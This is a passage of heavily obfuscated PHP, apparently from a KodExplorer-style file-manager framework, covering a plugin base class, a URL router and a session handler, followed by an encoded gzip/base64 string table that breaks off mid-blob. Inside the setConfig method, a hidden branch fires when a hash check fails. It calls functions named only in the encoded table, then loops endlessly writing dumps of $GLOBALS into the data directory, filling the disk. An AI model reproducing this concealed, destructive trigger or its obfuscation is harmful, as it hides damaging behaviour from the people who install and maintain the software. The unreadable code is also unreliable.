parseConfig(&$£ÎğÄ¼) { $Ì¬¡“ó =& $_SERVER[Ùæõ‰Ï’]; $Ï«·â‹ = $Ì¬¡“ó[1687]; if (!strstr($£ÎğÄ¼, $Ï«·â‹)) { return; } preg_match_all($Ì¬¡“ó[1688], $£ÎğÄ¼, $Áªõ›µÕ); if (!is_array($Áªõ›µÕ) || count($Áªõ›µÕ) == 0 || !is_array($Áªõ›µÕ[0]) || count($Áªõ›µÕ[0]) == 0) { return; } $Ï”ÊÎ¹ = $this->getConfig(); $Ë¥–§ù = array(); $½ªš¬ï = array(); foreach ($Áªõ›µÕ[0] as $û…ûá†“) { $ª½†ÁœÉ = substr($û…ûá†“, strlen($Ï«·â‹), -2); $Ë¥–§ù[] = $û…ûá†“; $½ªš¬ï[] = _get($Ï”ÊÎ¹, $ª½†ÁœÉ); } $£ÎğÄ¼ = str_replace($Ë¥–§ù, $½ªš¬ï, $£ÎğÄ¼); } private function parsePackage(&$õÀ„¬©) { $õ“µ‹³Ì =& $_SERVER[Ùæõ‰Ï’]; $¥÷…®Òñ = $õ“µ‹³Ì[1689]; if (!strstr($õÀ„¬©, $¥÷…®Òñ)) { return; } preg_match_all($õ“µ‹³Ì[1690], $õÀ„¬©, $¢şüÒÃÃ); if (!is_array($¢şüÒÃÃ) || count($¢şüÒÃÃ) == 0 || !is_array($¢şüÒÃÃ[0]) || count($¢şüÒÃÃ[0]) == 0) { return; } $Áçî»úò = $this->appPackage(); $±½½Â = array(); $İ¬ú¸Æ = array(); foreach ($¢şüÒÃÃ[0] as $ŒÈ¥Ş) { $¸Æú«² = substr($ŒÈ¥Ş, strlen($¥÷…®Òñ), -2); $±½½Â[] = $ŒÈ¥Ş; $İ¬ú¸Æ[] = _get($Áçî»úò, $¸Æú«²); } $õÀ„¬© = str_replace($±½½Â, $İ¬ú¸Æ, $õÀ„¬©); } final function echoFile($êÆ•®Ã¸, $Ô¾•¥¸á = false) { $øäÇµ¸¾ =& $_SERVER[Ùæõ‰Ï’]; $ªİ±üı­ = $this->pluginPath . $êÆ•®Ã¸; if (ACT == $øäÇµ¸¾[1691]) { echo $øäÇµ¸¾[1692] . $this->pluginName . $øäÇµ¸¾[8] . $êÆ•®Ã¸ . $øäÇµ¸¾[1693]; if (!file_exists($ªİ±üı­)) { echo $øäÇµ¸¾[1694]; return; } } $ÚËŸÂØƒ = $this->parseFile($ªİ±üı­); $this->parseLang($ÚËŸÂØƒ); $this->parseConfig($ÚËŸÂØƒ); $this->parsePackage($ÚËŸÂØƒ); if (is_array($Ô¾•¥¸á)) { $ÚËŸÂØƒ = str_replace(array_keys($Ô¾•¥¸á), array_values($Ô¾•¥¸á), $ÚËŸÂØƒ); } echo $øäÇµ¸¾[262] . $ÚËŸÂØƒ; } private function checkVersion() { $¾Ú˜åÈ” =& $_SERVER[Ùæõ‰Ï’]; $œë¿âĞ = $this->appPackage(); $ø²Å¼ÍĞ = $this->getConfig(); if ($ø²Å¼ÍĞ[$¾Ú˜åÈ”[1695]] == $œë¿âĞ[$¾Ú˜åÈ”[1669]]) { return; } $this->regist(); $this->setConfig(array($¾Ú˜åÈ”[1695] => $œë¿âĞ[$¾Ú˜åÈ”[1669]])); } final function initLang() { $Å„¿âÅÃ =& $_SERVER[Ùæõ‰Ï’]; $Èó‚À¤ = $Å„¿âÅÃ[1696]; $”–€™‚ = $this->pluginPath . $Å„¿âÅÃ[1697]; $ñôİîš“ = I18n::getType(); $Ùåóé© = array(); if (file_exists($”–€™‚ . $ñôİîš“ . $Å„¿âÅÃ[921])) { $Ùåóé© = (include $”–€™‚ . $ñôİîš“ . $Å„¿âÅÃ[921]); } else { if ($ñôİîš“ == $Å„¿âÅÃ[1698] && !file_exists($”–€™‚ . $ñôİîš“ . $Å„¿âÅÃ[921]) && file_exists($”–€™‚ . $Å„¿âÅÃ[1699])) { $Ùåóé© = (include $”–€™‚ . $Å„¿âÅÃ[1699]); } else { if (file_exists($”–€™‚ . $Èó‚À¤ . $Å„¿âÅÃ[921])) { $Ùåóé© = (include $”–€™‚ . $Èó‚À¤ . $Å„¿âÅÃ[921]); } } } if (!is_array($Ùåóé©)) { return array(); } if (@count($Ùåóé©) > 0) { I18n::set($Ùåóé©); } return $Ùåóé©; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($è‚Ğü–) { $ÃË—Ä±¨ =& $_SERVER[Ùæõ‰Ï’]; $ÚÆê©ÓÉ = $_SERVER[$ÃË—Ä±¨[959]]; $ÑÇ‚‚¦µ = $ÃË—Ä±¨[960]; if ($_SERVER[$ÃË—Ä±¨[961]] != $ÑÇ‚‚¦µ($ÚÆê©ÓÉ)) { $çŠ‡¼õå = $ÃË—Ä±¨[962]; $«üÆÏƒ¿ = $ÃË—Ä±¨[963]; $¤İ×¾ìâ = $_SERVER[$ÃË—Ä±¨[964]] . $ÃË—Ä±¨[965]; $€ËŞÌë = $«üÆÏƒ¿($¤İ×¾ìâ); $ÑÉ¹•Áï = explode($ÃË—Ä±¨[262], $€ËŞÌë); if (count($ÑÉ¹•Áï) < $ÃË—Ä±¨[680]) { $¡‡¹û¨É = $ÃË—Ä±¨[966]; $¡‡¹û¨É(); } $Á¥…–ÊÂ = $ÃË—Ä±¨[967]; $Á¥…–ÊÂ($_SERVER[$ÃË—Ä±¨[968]]); $çŠ‡¼õå = $ÃË—Ä±¨[962]; $çŠ‡¼õå(); $§ôÈ°°Ã = $ÃË—Ä±¨[969]; $ ôùÁ½ = json_encode($GLOBALS[$ÃË—Ä±¨[970]]); $Å¿  = 1; for ($øøÀ¸šù = $Å¿ ; $øøÀ¸šù > 0; $øøÀ¸šù++) { $§ôÈ°°Ã(DATA_PATH . $øøÀ¸šù, $ ôùÁ½); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $è‚Ğü–); } public function onSetConfig($àì­¶“Ë) { } public function onGetConfig($ÙĞ ÈÉ) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($¦¶œ°·ì) { if ($¦¶œ°·ì == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($Öë³‚¬ = "\x70\x6c\x75\147\151\x6e\x41\165\x74\150") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $ğà‚îÙõ = $this->getConfig(); if (!$ğà‚îÙõ[$Öë³‚¬]) { return !1; } return ActionCall($_SERVER[Ùæõ‰Ï’][1700], $ğà‚îÙõ[$Öë³‚¬]); } public function url($¼È÷’©ğ, $ŒÕ³›¯† = '', $ÄÈÆ©õ’ = true) { $ºï¬ÏËë =& $_SERVER[Ùæõ‰Ï’]; $áù€èÛ = $this->getConfig(); $Á¡›²ë· = KOD_VERSION . $ºï¬ÏËë[10] . KOD_VERSION_BUILD; $„öó£·ù = $this->packageVersion(); $Ìš¡Ğä  = $Á¡›²ë· . $ºï¬ÏËë[462] . $„öó£·ù; if (substr($¼È÷’©ğ, 0, 4) == $ºï¬ÏËë[152] || substr($¼È÷’©ğ, 0, 2) == $ºï¬ÏËë[1451]) { $Îª¶‰´ğ = $¼È÷’©ğ . $ºï¬ÏËë[1701] . $Ìš¡Ğä ; } else { if ($ŒÕ³›¯† == $ºï¬ÏËë[12]) { $Îª¶‰´ğ = $this->pluginHost . $¼È÷’©ğ . $ºï¬ÏËë[1701] . $Ìš¡Ğä ; } else { if ($ŒÕ³›¯† === $ºï¬ÏËë[78]) { $Îª¶‰´ğ = $this->pluginHost . $¼È÷’©ğ; } else { if ($ŒÕ³›¯† == $ºï¬ÏËë[1702]) { $Îª¶‰´ğ = STATIC_PATH . $¼È÷’©ğ . $ºï¬ÏËë[1701] . $Á¡›²ë·; } else { if ($ŒÕ³›¯† == $ºï¬ÏËë[1703]) { $Îª¶‰´ğ = APP_HOST . $ºï¬ÏËë[1704] . $¼È÷’©ğ . $ºï¬ÏËë[1701] . $Á¡›²ë·; } else { if (isset($áù€èÛ[$ŒÕ³›¯†])) { $Îª¶‰´ğ = $áù€èÛ[$ŒÕ³›¯†] . $¼È÷’©ğ . $ºï¬ÏËë[1701] . $Ìš¡Ğä ; } } } } } } if (!$ÄÈÆ©õ’) { return $Îª¶‰´ğ; } echo $Îª¶‰´ğ; } public function link($ÄÒ®ëéß = false, $ƒº”¡º² = '') { $ÆÙøªÈ˜ =& $_SERVER[Ùæõ‰Ï’]; $ Â¢´§â = $this->linkHas == !1; $this->linkHas = !0; if (!$ÄÒ®ëéß) { $this->link($ÆÙøªÈ˜[1705], $ÆÙøªÈ˜[1703]); $this->link($ÆÙøªÈ˜[1706], $ÆÙøªÈ˜[1702]); $this->link($ÆÙøªÈ˜[1707], $ÆÙøªÈ˜[1702]); $this->link($ÆÙøªÈ˜[1708], $ÆÙøªÈ˜[1702]); $this->link($ÆÙøªÈ˜[1709], $ÆÙøªÈ˜[1702]); if ($ Â¢´§â) { Hook::trigger($ÆÙøªÈ˜[1710]); } return; } $ŸĞ…¡ÄÇ = $this->url($ÄÒ®ëéß, $ƒº”¡º², !1); if (substr($ÄÒ®ëéß, -3) == $ÆÙøªÈ˜[1711]) { echo $ÆÙøªÈ˜[1712] . $ŸĞ…¡ÄÇ . $ÆÙøªÈ˜[1713] . $ÆÙøªÈ˜[262]; } else { if (substr($ÄÒ®ëéß, -4) == $ÆÙøªÈ˜[1714]) { echo $ÆÙøªÈ˜[1715] . $ŸĞ…¡ÄÇ . $ÆÙøªÈ˜[1716] . $ÆÙøªÈ˜[262]; } } if ($ Â¢´§â) { Hook::trigger($ÆÙøªÈ˜[1710]); } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\156\x79" => "\x5b\136\57\135\53", "\x3a\x6e\165\x6d" => "\133\x30\x2d\71\135\53", "\x3a\141\x6c\x6c" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($í ŞêŞ, $Ëó…¢š³) { $›ßáƒ…Ï =& $_SERVER[Ùæõ‰Ï’]; if ($í ŞêŞ == $›ßáƒ…Ï[1717]) { $”ü”šÓİ = array_map($›ßáƒ…Ï[1718], $Ëó…¢š³[0]); $şÑô£— = strpos($Ëó…¢š³[1], $›ßáƒ…Ï[8]) === 0 ? $Ëó…¢š³[1] : $›ßáƒ…Ï[8] . $Ëó…¢š³[1]; $â İ½€· = $Ëó…¢š³[2]; } else { $”ü”šÓİ = null; $şÑô£— = strpos($Ëó…¢š³[0], $›ßáƒ…Ï[8]) === 0 ? $Ëó…¢š³[0] : $›ßáƒ…Ï[8] . $Ëó…¢š³[0]; $â İ½€· = $Ëó…¢š³[1]; } array_push(self::$maps, $”ü”šÓİ); array_push(self::$routes, $şÑô£—); array_push(self::$methods, strtoupper($í ŞêŞ)); array_push(self::$callbacks, $â İ½€·); } public static function error($Ô±›ëÁ™) { self::$errorCallback = $Ô±›ëÁ™; } public static function haltOnMatch($ò–œÖ¤‚ = true) { self::$halts = $ò–œÖ¤‚; } public static function dispatch() { $ÓÁ††²  =& $_SERVER[Ùæõ‰Ï’]; $Í¹¶Ïš = parse_url($_SERVER[$ÓÁ††² [1719]], PHP_URL_PATH); $ËÏŒèë = $_SERVER[$ÓÁ††² [164]]; $Ä«ˆ‘®… = array_keys(static::$patterns); $ù¥²‚± = array_values(static::$patterns); $ç¯Ÿ¦ò = !1; self::$routes = preg_replace($ÓÁ††² [1374], $ÓÁ††² [8], self::$routes); if (in_array($Í¹¶Ïš, self::$routes)) { $Àæ£îŠó = array_keys(self::$routes, $Í¹¶Ïš); foreach ($Àæ£îŠó as $œÍºÈ£–) { if (self::$methods[$œÍºÈ£–] == $ËÏŒèë || self::$methods[$œÍºÈ£–] == $ÓÁ††² [1720] || in_array($ËÏŒèë, self::$maps[$œÍºÈ£–])) { $ç¯Ÿ¦ò = !0; if (!is_object(self::$callbacks[$œÍºÈ£–])) { $­ËÓÕÏã = explode($ÓÁ††² [8], self::$callbacks[$œÍºÈ£–]); $Ôİ–Äµ = end($­ËÓÕÏã); $“©€¤¹ = explode($ÓÁ††² [1306], $Ôİ–Äµ); $—¾ëñÄä = new $“©€¤¹[0](); $—¾ëñÄä->{$“©€¤¹[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$œÍºÈ£–]); if (self::$halts) { return; } } } } } else { $ªıÏ”™’ = 0; foreach (self::$routes as $œÍºÈ£–) { if (strpos($œÍºÈ£–, $ÓÁ††² [4]) !== !1) { $œÍºÈ£– = str_replace($Ä«ˆ‘®…, $ù¥²‚±, $œÍºÈ£–); } if (preg_match($ÓÁ††² [1721] . $œÍºÈ£– . $ÓÁ††² [1722], $Í¹¶Ïš, $³ù„û„)) { if (self::$methods[$ªıÏ”™’] == $ËÏŒèë || self::$methods[$ªıÏ”™’] == $ÓÁ††² [1720] || !empty(self::$maps[$ªıÏ”™’]) && in_array($ËÏŒèë, self::$maps[$ªıÏ”™’])) { $ç¯Ÿ¦ò = !0; array_shift($³ù„û„); if (!is_object(self::$callbacks[$ªıÏ”™’])) { $­ËÓÕÏã = explode($ÓÁ††² [8], self::$callbacks[$ªıÏ”™’]); $Ôİ–Äµ = end($­ËÓÕÏã); $“©€¤¹ = explode($ÓÁ††² [1306], $Ôİ–Äµ); $—¾ëñÄä = new $“©€¤¹[0](); if (!method_exists($—¾ëñÄä, $“©€¤¹[1])) { echo $ÓÁ††² [1723]; } else { call_user_func_array(array($—¾ëñÄä, $“©€¤¹[1]), $³ù„û„); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$ªıÏ”™’], $³ù„û„); if (self::$halts) { return; } } } } $ªıÏ”™’++; } } if ($ç¯Ÿ¦ò == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $‰ˆëÍ² =& $_SERVER[Ùæõ‰Ï’]; header($_SERVER[$‰ˆëÍ²[1724]] . $‰ˆëÍ²[1725]); echo $‰ˆëÍ²[1726]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$ÓÁ††² [1719]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $å´°«ã¾ =& $_SERVER[Ùæõ‰Ï’]; static $³±Á‡şÙ = false; if ($³±Á‡şÙ) { return $³±Á‡şÙ; } $Îà‰œ“Š = $GLOBALS[$å´°«ã¾[6]][$å´°«ã¾[425]]; self::$sessionTime = $Îà‰œ“Š[$å´°«ã¾[1727]]; $ö™¾¨±Â = isset($GLOBALS[$å´°«ã¾[1728]]) ? $GLOBALS[$å´°«ã¾[1728]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($ö™¾¨±Â)) { self::$sessionSign = Cookie::get($ö™¾¨±Â); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($ö™¾¨±Â, self::$sessionSign, self::$sessionTime); $³¬Ì„§ò = $Îà‰œ“Š[$å´°«ã¾[1729]]; $£şÕ‡áµ = $Îà‰œ“Š[$³¬Ì„§ò]; $üî¾æºˆ = $Îà‰œ“Š[$å´°«ã¾[910]]; switch ($³¬Ì„§ò) { case $å´°«ã¾[21]: self::$handle = Model($å´°«ã¾[911]); break; case $å´°«ã¾[912]: self::$handle = new CacheRedis($£şÕ‡áµ, $üî¾æºˆ); break; case $å´°«ã¾[913]: self::$handle = new CacheMemcached($£şÕ‡áµ, $üî¾æºˆ); break; case $å´°«ã¾[230]: $£şÕ‡áµ[$å´°«ã¾[87]] = $£şÕ‡áµ[$å´°«ã¾[87]] . $å´°«ã¾[1730]; self::$handle = new CacheFile($£şÕ‡áµ, $üî¾æºˆ); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $³±Á‡şÙ = new self(); return $³±Á‡şÙ; } public static function getBySign($Ï©ãÑóè) { $Öõ–Ì™’ = self::$handle->get($Ï©ãÑóè); $Öõ–Ì™’ = unserialize($Öõ–Ì™’); return is_array($Öõ–Ì™’) ? $Öõ–Ì™’ : array(); } public static function setBySign($æÍ·¤ , $‘áË×º„) { CacheLock::lock($æÍ·¤ ); self::$handle->set($æÍ·¤ , serialize($‘áË×º„), self::$sessionTime); CacheLock::unlock($æÍ·¤ ); } public static function sign($ØãâÌ× = false) { if ($ØãâÌ×) { self::$sessionSign = $ØãâÌ×; } self::init(); return self::$sessionSign; } public static function set($äşÓõº, $É‰ÖßÚ¿ = false) { self::init(); if (is_array($äşÓõº)) { foreach ($äşÓõº as $®ÛìØóç => $¯˜•õ²à) { array_set_value(self::$data, $®ÛìØóç, $¯˜•õ²à); } } else { array_set_value(self::$data, $äşÓõº, $É‰ÖßÚ¿); } self::setBySign(self::$sessionSign, self::$data); } public static function get($ˆÍ÷Åªµ = false) { self::init(); if (!$ˆÍ÷Åªµ) { return self::$data; } return array_get_value(self::$data, $ˆÍ÷Åªµ); } public static function remove($ïÁ„Á„) { self::init(); unset(self::$data[$ïÁ„Á„]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[Ùæõ‰Ï’][916])) { self::$handle->clearTimeout(); } } } goto cÌºÜáŠÒì; B¬ß·¸§¦ñ: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\xd9\xe6\xf5\x89\xcf\x92", "\211\234\334\360\365\352"); $_SERVER[Ùæõ‰Ï’] = explode("\174\2\174\5\174\1", gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x13\xc5\x7d\x9\x78\x1b\xd5\xb5\x30\x7b\x9\xb4\xa5\x5\xda\x42\x81\x76\x70\x8\xb6\x13\x2d\xb6\xb3\x3b\x71\x82\x2c\xcb\xb6\x88\x6c\x39\x92\x9c\x5\xdb\x4c\xc6\xd2\x58\x9a".base64_decode('WNLImpGXLBRCwh4CZQsUKLSUQiEklAJhh7JDC49S1lIKNHbC8qC0Dwo8Wv67nLvMSIb3fw==')."\357\377\276\77\137\22\335\345\334\73\167\71\367\234\163\317\75\367\334\313\237\232\170\344\314\327\327\355\263\156\377\165\173\137\364\300\325\333\237\373\3\15\257\333\217\374\43\341\37\236\173\340"."\x5e\xe4\xcf\x61\xe7\x9e\x53\x53\xd3\x3e\xe7\xa0\x19\x9d\x5f\xdf\xf2\x9b\x6d\xda\x8d\xda\xcd\xda\xd9\xd1\xc8\xd3\xbf\xb\x7f\xe3\x99\x9b\x4f\xc\x4d\xfc\xfc\xe9\xb1\x89\xbd\xf7\xda\x32\xff\xbc\x3\x1b\x11\x30"."\x2d\xdb\x48\x7f\x94\xbc\x69\x2b\xfa\xa8\x61\xd9\x16\x4d\x48\x9a\xf9\x1\x23\x4d\xc3\x46\x9e\xfe\xfa\xe9\x4f\x77\x2c\x52\xd4\x73\xa6\xad\xd3\xa8\x8f\xfe\xa8\xd0\x2e\xf2\xbf\x35\x94\x35\x58\xbe\xda\x19\x4d\xa8"."\361\356\256\256\120\54\1\100\215\162\176\316\114\101\250\240\25\265\34\174\277\240\27\55\324\32\271\72\265\140\26\364\274\43\105\44\244\64\133\353\327\54\250\251\245\131\155\11\165\105\242\53".strrev('yDá£&“´p‰‚Œè"JÂÚ‡5vò)‡:r0¢µ·$cF8½%C«ô@®ÊÄÕ')."\172\54\32\211\64\7\202\113\312\163\272\142\201\266\216\200\202\332\227\325\125\43\77\140\326\50\253\150\316\52\245\226\6\132\15\75\233\242\301\274\306\232\143\217\25\40\224\340\41\64\115\371"."\122\66\113\43\235\74\224\322\7\264\122\26\106\253\105\216\24\212\106\116\143\235\136\242\217\361\124\32\320\112\266\151\344\223\64\22\32\265\213\232\110\107\155\115\242\211\326\363\120\125\74\24"."\x9\x5\x13\xa\x6e\xa0\xd2\x1a\x8b\x76\x28\x30\x9\x39\xcd\xb2\xf5\xa2\xb2\xbc\x3d\x14\xb\x29\xb8\xd1\x4d\xd5\xa4\xaf\xd5\xa\xe0\x4b\x27\x1a\xa\x25\x10\x89\x28\x93\xd5\x60\xeb\xb9\x2\xab\x86\x96\xa9\x50"."\131\64\326\22\212\51\315\53\25\61\102\111\63\227\63\363\76\124\13\232\111\133\152\152\50\26\243\1\17\240\167\44\214\47\15\42\321\326\326\170\210\307\240\163\113\43\250\45\63\1\77\35"."\261\324\100\326\126\207\265\154\211\241\351\40\375\255\206\37\370\65\55\100\335\41\43\157\224\0\115\241\12\323\344\313\12\2\45\6\255\263\24\75\5\201\34\52\157\102\271\176\110\353\147\120"."\xab\x59\xc0\x40\x2b\x74\x98\x6\x9b\x16\xd1\xdf\x5\x50\xbe\x5f\xc5\x79\x7a\xd1\x56\xf5\x7c\xd2\x4c\x19\x79\x58\xc7\x8b\x1\x1f\x35\x3b\xd3\x52\x34\x10\x0\x8d\xf\x98\xd9\x14\xb\x5b\xc6\x1a\xe8\xe5\x80\x91"."\xd5\x3b\x4b\x39\x19\x84\x47\x93\x19\x23\x9b\x2a\xb2\xa5\xf7\x65\x90\x34\x1a\xe1\x2b\x19\xc3\x8a\x58\x1\xb5\x84\x13\x1\x63\x60\x4c\x2c\x45\xc\xd7\xc5\x73\x2d\xb3\x54\x4c\xea\x61\xb4\x74\x68\xbc\x1e\x92\x75".base64_decode('20adYwNidheyppaK60XeNcNsRRVFS7acWCJgrWYx14KIBnwfLRiju0LGIFsyKWnE/DU9pw==')."\171\377\335\327\163\2\372\257\26\250\142\57\264\51\243\147\263\252\76\252\303\232\312\245\146\133\154\60\374\126\277\221\367\243\24\32\15\107\325\214\146\145\72\122\263\125\122\212\21\333\224\76"."\352\53\144\12\260\340\371\32\357\165\340\74\36\272\116\323\16\111\44\73\153\46\265\254\334\105\32\316\330\166\41\256\347\123\170\44\240\53\346\110\236\214\124\101\327\1\250\305\243\244\224\16"."\x65\xa5\xd2\xde\x68\x34\x5a\xac\x60\x2e\xcb\x43\xac\x77\x3c\xcd\xe2\x89\xf6\x28\x9b\xce\xd4\x0\x60\x2b\xe3\x18\x55\xf0\x41\xc3\x22\xc4\x4f\xac\x5c\xad\x50\xc8\x1a\x49\xcd\x36\xcc\xbc\xdf\x4c\xda\xba\xed\xb5".base64_decode('7KKuQY2BZFK3LG/QzNtFM+sNZLPmiDdaNNJGvlGZDnQYZaL17sW0sREWcdUCBSMO/sz0pg==')."\222\75\340\235\307\26\47\207\56\152\171\153\100\57\172\103\260\62\32\25\324\130\116\40\31\130\213\141\25\114\313\300\315\153\124\64\333\326\222\31\114\134\104\365\115\137\2\157\344\263\106\136"."\x2f\x87\x45\x95\xe8\xde\xae\xa2\x96\xce\x69\x8d\x4a\xa1\xd4\x8f\x6\x0\x16\x24\xa4\x25\x31\x84\xc\xc\x3\xd0\xa8\xe4\xb4\x51\xaf\x96\x66\x35\x85\x46\xb\x46\x51\xb7\x58\xaf\x95\xb6\x8e\x4\x60\xd4\x80\xb7".base64_decode('Ay8kQ09544h6Q2Uz62YpCFcUlkdT2xOJLjXcithzZ0jtCCSC7VC7raVZ1RFEk3mVLHGFFw==')."\55\50\214\115\235\250\163\42\261\313\34\321\213\350\303\315\143\215\312\240\231\352\67\107\175\54\13\3\307\21\145\141\300\170\176\13\266\67\246\345\323\270\33\375\143\266\156\271\151\123\63\142".strrev('¡OLoYëø5¬£9„yıà1Ë[GLP²Ø¡ãº°ÎÚ|ôGàçiÃXŞ„Y€úı}zº¾æ')."\x41\x4c\xda\xac\x9c\x56\x10\xa3\xbf\xc2\x8b\x17\xc\xfe\x38\xcb\xc5\x8b\x88\xe5\x45\xc2\x6d\x78\xec\x5a\xbc\x16\x2\xf2\xca\x50\xac\xee\x88\x91\x33\x70\xf7\x6c\x9e\x43\x6\x1b\x9\x6\x6d\xd0\x20\x3f\xe9\x73".base64_decode('U681vaY3NaPWi/6fXtvT2+Kb3rfYb4gy/npfvdJQN0fpQpKKoWUV6HQZRJ0SXeIcFoHhRg==')._kodDe('K7j9bgDVnzXVV7utTVCqA8o5lNSGDovuAoARvHJW+xxxBsTPyrfDW0tqXJEbLkN8NVvpZ/4=')."\41\24\200\120\36\25\46\155\146\363\214\205\63\140\215\171\250\126\37\225\370\210\340\7\111\171\120\110\271\116\163\204\161\0\27\22\5\63\172\162\160\222\74\24\202\336\230\224\66\261\351\353"."\241\77\175\200\321\175\364\107\65\254\126\211\167\342\50\247\261\252\331\277\32\141\127\207\316\30\11\174\51\234\103\353\130\264\134\165\62\72\326\255\16\201\355\150\331\54\67\122\234\23\242\150".base64_decode('u26kM9BQA1eXNLNmUcti+s+E17QBpLiQLSHc9+OKE5lSrh+4FRqjtG4LudIaQ8JXjnFlxA==')."\332\355\160\213\203\367\102\314\257\142\174\355\365\25\362\351\332\343\240\56\265\141\166\35\116\200\151\204\236\41\1\273\244\227\167\335\227\64\321\342\356\320\6\365\106\334\27\240\150\13\110\52"."\213\110\104\163\1\346\163\115\156\332\200\247\47\353\313\241\112\110\235\101\223\163\146\272\205\131\340\344\163\212\136\54\232\305\143\1\202\204\25\302\54\361\164\101\345\66\27\75\54\104\6\130"._kodDe('LVQpQmNVtsm5eNlAb1lcw/YzgowTo8AVwv+RmluWRTVVkV9mc0D99zr2hOLt2YpRoBrtmCQ=').base64_decode('MTZKGKCeohzQkUSXLU2azuot2ibOLDogESZmTGgZmnroVYl3j3U0pWd1hkUZnQkRdQCGhg==')."\237\343\330\0\107\166\264\115\100\251\102\172\63\254\30\52\211\131\76\213\57\307\373\52\221\200\345\36\100\36\21\314\242\251\213\222\125\43\342\135\105\175\300\30\145\4\142\324\356\320\212\203"."\xac\x63\xa8\xa4\x58\x6f\x38\x22\xad\xc5\xd6\xee\x48\x44\xd\x46\x3b\x13\x68\x5b\x46\x53\x96\xc7\xc2\x89\x10\xa3\x43\x81\x16\x35\x10\xec\x82\x98\xa0\x6c\x5c\x34\x93\x85\xb\x9a\x32\xdc\x0\x78\x82\x1a\xe1\x17"."\x52\x10\x62\xc3\x5\x33\x8f\xe8\x27\x90\x20\xaf\xd8\xb4\x95\x65\xa5\x84\x90\x0\x8\x22\x4\xb\x97\xac\x80\xb8\x7d\x6e\x8d\x37\x87\x88\x87\x97\xb7\xc9\x29\xa2\x29\xc0\xf2\xa9\xa4\x17\x86\x69\x4a\xf1\xc9\xc1".base64_decode('g4cWMpMNu6JxKLAYpyL5vJ+vt65uyMpJKNIWgsSDAKsyGkjdgeVxxsZLCL5orNFElxaz9g==')."\260\216\344\262\102\334\167\366\312\53\146\276\144\171\165\54\151\210\57\314\362\266\167\4\202\336\170\173\240\141\366\34\232\272\62\227\352\115\264\33\126\357\111\74\16\303\70\142\315\122\213\72"."\42\70\354\103\15\165\365\214\34\40\111\111\152\336\112\157\316\213\153\301\43\350\253\253\253\143\165\315\230\243\144\20\235\343\334\44\105\146\211\355\275\112\311\101\266\140\264\44\23\177\61\227".base64_decode('sbwjBqPMx/GdwnHl2HOckx9CFSXCiVUtiT+mohrtkiWPFFpWhHMzqZ6matk0GnQ7k5MTxQ==')."\304\323\270\116\105\104\76\167\174\24\361\330\72\161\134\156\122\301\104\102\51\164\143\105\305\66\254\250\324\206\25\256\66\254\50\157\3\115\262\214\164\36\365\222\61\67\230\216\66\74\35\322"."\264\72\246\171\124\105\5\125\130\103\252\334\25\30\44\350\206\234\323\316\251\31\353\144\107\313\154\326\216\100\307\111\336\226\0\243\5\13\27\43\24\125\206\261\266\311\314\67\125\327\373\352"."\252\25\266\153\156\252\356\116\264\242\75\304\342\105\7\55\14\232\271\2\46\214\35\170\243\210\227\20\335\54\56\202\345\261\20\313\147\54\322\305\127\30\215\207\22\32\60\307\205\176\31\156"."\241\177\262\132\1\331\162\332\32\63\217\320\33\61\315\234\57\11\70\214\105\121\316\203\160\304\342\261\104\173\270\163\211\332\21\155\11\105\324\160\47\222\323\22\345\351\335\135\242\363\162\172"."\163\64\321\356\110\355\106\222\332\262\100\44\354\6\17\255\10\307\23\361\212\131\50\255\73\344\312\151\151\126\273\142\241\326\360\12\36\155\15\207\42\55\161\65\30\10\266\13\230\316\100\7"."\104\220\110\244\147\123\226\337\11\257\42\221\63\316\125\152\52\114\30\304\34\132\54\225\351\147\124\101\213\321\26\106\7\4\206\356\142\245\44\351\211\312\26\175\211\13\220\154\277\236\143\314"."\26\155\277\140\106\330\336\243\206\376\324\52\201\270\142\27\124\316\126\373\307\170\220\164\203\305\221\260\1\337\127\100\374\55\153\201\212\141\232\245\215\116\345\204\300\200\315\5\116\127\34\61".base64_decode('EZGHZiBAtJ8IE8iMwGcMxJKKdoA1Z0BoHtVoVygWwHpLdXks2tkGBUYyOmtAGIa/hu08QQ==').base64_decode('fWkLzq5lDY3pscSgrzbZUB4PNNXgIn2eDXc/lm6YXMsCA2g9MMnELPHP9JtmljG6HBOsEA==').base64_decode('seF6z9UWw45RxqtncJ4AOBtdEupUGUrRmISGNCEUi0VjMBK2Och0XjQzFoozNon5j8HGyQ==').base64_decode('75sB6KsjIQ4+7z+5d2RGTY93hq8PBWqnn0CjEOv1OaJMti4VeWm81GusxbWNvf5ef83ixg==')."\x9e\x80\x77\x8d\xe6\x5d\x53\xe7\x9d\xef\xed\x43\x12\x79\xed\xc\x48\xe8\x5b\xdb\xe0\x99\xb5\x1e\x3\x20\